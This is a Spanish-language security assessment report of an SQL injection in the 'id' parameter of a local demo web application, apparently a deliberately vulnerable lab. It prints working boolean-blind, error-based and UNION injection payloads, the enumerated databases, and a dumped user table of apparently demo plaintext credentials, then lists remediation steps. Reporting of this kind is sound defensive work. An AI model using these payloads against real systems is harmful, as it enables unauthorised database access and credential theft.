# Informe de Análisis de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-25T11:40:58Z  
**Herramienta:** sqlmap 1.9.10  

---

## Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad crítica de **SQL Injection** en el parámetro `id` de la aplicación web. La explotación permitió extraer la totalidad de los datos almacenados en la base de datos, incluyendo credenciales de usuarios en texto plano.

---

## Descripción del Objetivo

La aplicación web expone un formulario de búsqueda de usuarios (`Search user`) en la ruta principal (`/`). El formulario acepta un parámetro `id` vía método GET y devuelve información del usuario correspondiente.

**Stack tecnológico detectado:**
- Sistema operativo del servidor: Linux Debian
- Servidor web: Apache 2.4.65
- Lenguaje: PHP 8.1.33
- Base de datos: MySQL 5 (MariaDB fork)

---

## Vulnerabilidad Encontrada

### SQL Injection en parámetro `id` (GET)

**Clasificación:** SQL Injection (CWE-89)  
**Severidad:** CRÍTICA  
**CVSS Score estimado:** 9.8  

**URL vulnerable:**
```
http://web.dev.local:8083/?id=1&Submit=Submit
```

**Parámetro afectado:** `id` (método GET)

### Tipos de inyección confirmados

| Tipo | Descripción |
|------|-------------|
| Boolean-based blind | AND boolean-based blind - WHERE or HAVING clause (subquery - comment) |
| Error-based | MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) |
| Time-based blind | MySQL >= 5.0.12 AND time-based blind (query SLEEP) |
| UNION query | Generic UNION query (NULL) - 2 columns |

### Payloads de ejemplo

```
Boolean-based blind:
id=5029' AND 6551=(SELECT (CASE WHEN (6551=6551) THEN 6551 ELSE (SELECT 2428 UNION SELECT 1249) END))-- -&Submit=Submit

Error-based:
id=5029' OR (SELECT 8777 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(8777=8777,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mTmP&Submit=Submit

UNION query:
id=5029' UNION ALL SELECT NULL,CONCAT(0x71717a6a71,0x72...,0x717a716a71)-- -&Submit=Submit
```

---

## Explotación

### Bases de datos enumeradas

```
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli_demo   <-- base de datos de la aplicación
[*] sys
```

### Tablas en `sqli_demo`

```
+-------+
| users |
+-------+
```

### Datos extraídos - Tabla `sqli_demo.users`

| user_id | username  | first_name | last_name | email               | password    |
|---------|-----------|------------|-----------|---------------------|-------------|
| 1       | admin     | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith    | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson  | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown    | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis    | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller   | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson   | Frank      | Wilson    | frank@example.com   | admin123    |

> ⚠️ **Las contraseñas se almacenan en texto plano**, lo que agrava significativamente el impacto.

---

## Impacto

1. **Divulgación total de datos:** Se extrajeron 8 registros de usuarios con credenciales completas.
2. **Contraseñas en texto plano:** Las contraseñas no están hasheadas, permitiendo uso inmediato.
3. **Escalada potencial:** El usuario `admin` (password: `password123`) podría tener acceso privilegiado a la aplicación y otros sistemas.
4. **Acceso a toda la base de datos:** A través de `information_schema` sería posible mapear la estructura completa del servidor de base de datos.

---

## Recomendaciones

1. **Usar consultas parametrizadas / prepared statements** en lugar de concatenación directa de parámetros en SQL.
2. **Hashear contraseñas** con algoritmos seguros (bcrypt, Argon2, scrypt).
3. **Aplicar principio de mínimo privilegio** al usuario de base de datos de la aplicación.
4. **Implementar validación y sanitización de inputs** en todos los parámetros de entrada.
5. **Configurar WAF** (Web Application Firewall) para detectar y bloquear patrones de SQL injection.
6. **Habilitar logging** de consultas anómalas para detección temprana.

---

## Conclusión

La aplicación web presenta una vulnerabilidad crítica de SQL Injection que permite a un atacante no autenticado extraer toda la información de la base de datos, incluyendo credenciales de usuarios almacenadas en texto plano. Se requiere corrección inmediata.
